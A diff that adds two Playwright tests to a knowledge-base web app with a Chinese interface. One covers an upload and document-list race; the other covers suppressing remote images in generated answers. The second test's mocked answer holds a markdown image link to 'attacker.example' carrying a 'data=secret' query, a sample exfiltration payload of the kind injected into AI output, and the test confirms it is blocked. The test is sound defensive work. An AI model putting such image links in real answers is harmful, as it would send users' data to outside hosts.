@@ -399,3 +399,109 @@ test("a rejected upload still reports failure", async ({ page }) => {
   });
   await expect(page.getByText("上传未能完成，请检查文件后重试。")).toBeVisible();
 });
+
+test("an accepted upload survives a list snapshot requested before it", async ({ page }) => {
+  let releaseList: () => void = () => {};
+  const listReleased = new Promise<void>((resolve) => { releaseList = resolve; });
+
+  await page.route("**/api/v1/**", async (route) => {
+    const path = pagePath(route);
+    const method = route.request().method();
+    if (path === "me") return json(route, accountA);
+    if (path === "knowledge-bases" && method === "GET") {
+      return json(route, { items: [{ id: "base-a", name: "账户 A 的知识库", status: "ACTIVE" }], has_more: false });
+    }
+    if (path === "knowledge-bases/base-a" && method === "GET") {
+      return json(route, { id: "base-a", name: "账户 A 的知识库", status: "ACTIVE" });
+    }
+    if (path === "knowledge-bases/base-a/documents" && method === "GET") {
+      // Hold the pre-upload snapshot until the accepted document has been rendered.
+      await listReleased;
+      return json(route, { items: [], has_more: false });
+    }
+    if (path === "knowledge-bases/base-a/documents" && method === "POST") {
+      return json(route, { document_id: "doc-up", task_id: "task-up" });
+    }
+    if (path === "documents/doc-up") {
+      return json(route, {
+        id: "doc-up",
+        original_name: "快照竞态.txt",
+        status: "RUNNING",
+        format: "TXT",
+        byte_size: 8,
+        latest_task_id: "task-up",
+        latest_task_status: "RUNNING",
+      });
+    }
+    if (path === "tasks/task-up") return json(route, { task_id: "task-up", status: "RUNNING", failure_code: null });
+    if (path === "questions") return json(route, { items: [], has_more: false });
+    throw new Error(`Unexpected workspace API: ${method} ${path}`);
+  });
+
+  const listRequest = page.waitForRequest((request) => request.method() === "GET"
+    && new URL(request.url()).pathname.endsWith("/knowledge-bases/base-a/documents"));
+  await page.goto("/knowledge-bases/base-a");
+  await listRequest;
+
+  await page.locator('input[type="file"]').first().setInputFiles({
+    name: "快照竞态.txt",
+    mimeType: "text/plain",
+    buffer: Buffer.from("snapshot"),
+  });
+  await expect(page.getByText("快照竞态.txt")).toBeVisible();
+
+  releaseList();
+  await page.waitForTimeout(500);
+  await expect(page.getByText("快照竞态.txt")).toBeVisible();
+});
+
+test("generated answers never request remote images", async ({ page }) => {
+  const external: string[] = [];
+  page.on("request", (request) => {
+    if (request.url().startsWith("https://attacker.example/")) external.push(request.url());
+  });
+
+  await page.route("**/api/v1/**", async (route) => {
+    const path = pagePath(route);
+    const method = route.request().method();
+    if (path === "me") return json(route, accountA);
+    if (path === "knowledge-bases" && method === "GET") {
+      return json(route, { items: [{ id: "kb-1", name: "竞态知识库", status: "ACTIVE" }], has_more: false });
+    }
+    if (path === "questions" && method === "GET") {
+      return json(route, {
+        items: [{
+          question_id: "q-1",
+          knowledge_base_id: "kb-1",
+          question: "历史问题一",
+          status: "SUCCEEDED",
+          finished_at: "2026-11-03T00:00:00Z",
+        }],
+        has_more: false,
+      });
+    }
+    if (path === "questions/q-1") {
+      return json(route, {
+        question_id: "q-1",
+        knowledge_base_id: "kb-1",
+        question: "历史问题一",
+        status: "SUCCEEDED",
+        finished_at: "2026-11-03T00:00:00Z",
+        answer: "历史答案正文\n\n![追踪像素](https://attacker.example/collect?data=secret)",
+        has_answer: true,
+        failure_code: null,
+        sources: [],
+      });
+    }
+    if (path === "knowledge-bases/kb-1/documents") {
+      return json(route, { items: [], has_more: false });
+    }
+    throw new Error(`Unexpected workspace API: ${method} ${path}`);
+  });
+
+  await page.goto("/conversations/q-1");
+  await expect(page.getByText("历史答案正文")).toBeVisible();
+  await expect(page.getByText("（图片已省略：追踪像素）")).toBeVisible();
+  await expect(page.locator("article img")).toHaveCount(0);
+  expect(external).toEqual([]);
+});
